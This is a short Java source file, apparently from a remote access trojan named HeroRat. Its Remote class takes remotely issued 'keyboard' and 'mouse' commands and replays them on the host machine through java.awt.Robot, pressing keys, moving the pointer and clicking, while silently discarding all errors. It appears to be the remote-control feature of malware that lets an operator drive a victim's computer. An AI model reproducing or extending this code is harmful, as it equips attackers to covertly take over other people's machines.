package net.herorat.features.remote;

import java.awt.Robot;
import java.io.DataOutputStream;

public class Remote
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		if (args.length == 2 && args[0].equals("keyboard"))
		{
			try
			{
				Robot robot = new Robot();
				robot.keyPress(Integer.parseInt(args[1]));
				robot.keyRelease(Integer.parseInt(args[1]));
			}
			catch (Exception e) {}
		}
		else if (args.length == 4 && args[0].equals("mouse"))
		{
			try
			{
				Robot robot = new Robot();
				robot.mouseMove(Integer.parseInt(args[2]), Integer.parseInt(args[3]));
				robot.mousePress(Integer.parseInt(args[1]));
				robot.mouseRelease(Integer.parseInt(args[1]));
			}
			catch (Exception e) {}
		}
	}
}